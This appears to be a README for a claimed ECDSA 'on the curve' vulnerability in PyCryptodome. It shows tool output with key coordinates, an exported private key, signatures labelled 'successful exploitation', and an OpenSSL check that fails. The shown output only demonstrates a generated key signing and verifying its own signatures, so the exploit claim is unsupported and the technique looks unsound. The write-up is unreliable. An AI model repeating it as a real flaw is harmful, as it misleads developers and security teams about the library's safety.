# ECC On The Curve Vulnerability

## Exploiting ECDSA Signatures

### Issue:

ECDSA signatures will improperly validate spoofed keys with forced public keys. In this proof-of-concept ECDSA keys are generated with ```length = len(x+y) ``` and ```d = random(length)-(x+y)``` to exploit PyCryptodomes ECDSA implementations.

- https://github.com/Legrandin/pycryptodome/blob/master/lib/Crypto/Signature/DSS.py
- https://www.rfc-editor.org/rfc/rfc6979
- https://csrc.nist.gov/csrc/media/publications/fips/186/3/archive/2009-06-25/documents/fips_186-3.pdf


### Proof of Concept:

```
 python .\ECCTool.py
X: 4105375390653649233713119777321734233266869078187987018407577420645365974521940631581724628993333063239514030334497
Y: 27675056301647551922849568396717635354139598802203471838229080227718009101673931134993105203564358052385576850782585
D: 27362011191244522599400977620412273256865510408751044570755755486992953037333842464164901064989290490254223630055135
------------------------------------------------------------------------------
Spoofed X: 4105375390653649233713119777321734233266869078187987018407577420645365974521940631581724628993333063239514030334497
X matches
Spoofed Y: 27675056301647551922849568396717635354139598802203471838229080227718009101673931134993105203564358052385576850782585
Y matches
------------------------------------------------------------------------------
Exporting Key
-----BEGIN PRIVATE KEY-----
MIG2AgEAMBAGByqGSM49AgEGBSuBBAAiBIGeMIGbAgEBBDCxxkp6uxcwPfu7QYSd
qjki7PEfmzP/jlBgZHLuOWGbzzVwLQN1OHwZzGNJpOiCtt+hZANiAAQarFRaqflo
I+d61SRvU8Za2EurxtW20eZzca7dnNYMYf3boIkDuAUU7FfO7l0/4iGzzvfUinng
o4N+LZfQYcTxmdwlkWOrfzCjtHDix6EznPO/LlxTsV+zfTJ/ijTjeXk=
-----END PRIVATE KEY-----
------------------------------------------------------------------------------
Testing deterministic-rfc6979 signature
Signature: b'06MvLMpqCepsI43/rUKaQDatG1q7ch+6jT1cpairfqIJNyNtHgCniD01Z6DWCZyjl5o4XX8YIQLZ1gJvz54FRQpt0SuJ2jGuJRzwy80tpJz1UjEpIEAB8q61tFM9WMF0'
deterministic-rfc6979 signature generated
deterministic-rfc6979 signature is validated!
Successful exploitation of on the curve vulnerability!
------------------------------------------------------------------------------
Testing FIPS-186-3 signature
Signature generated
Signature: b'yKQZ+itxNbdgbYMHZ9B0dHYxLtX00qNrmy0xGcwi1ODbEmk344wiQAFGq5mDy3hlD9UyWyy8vb1rQrjPvZKBgMbisnmYSHtZRr0fnGLJW11hFIcd1Cd73D26YWjLOdlo'
FIPS-186-3 signature is validated!
Successful exploitation of on the curve vulnerability!
------------------------------------------------------------------------------
Results for 'On the Curve Vulnerability':
RFC 6979: True
FIPS-186-3: True
```
### Testing against OpenSSL

```
OpenSSL> dgst -sha256 -sign key.pem -out signature.sign id.db
OpenSSL> dgst -sha256 -prverify key.pem -signature signature.sign id.db
Verification Failure
error in dgst
```
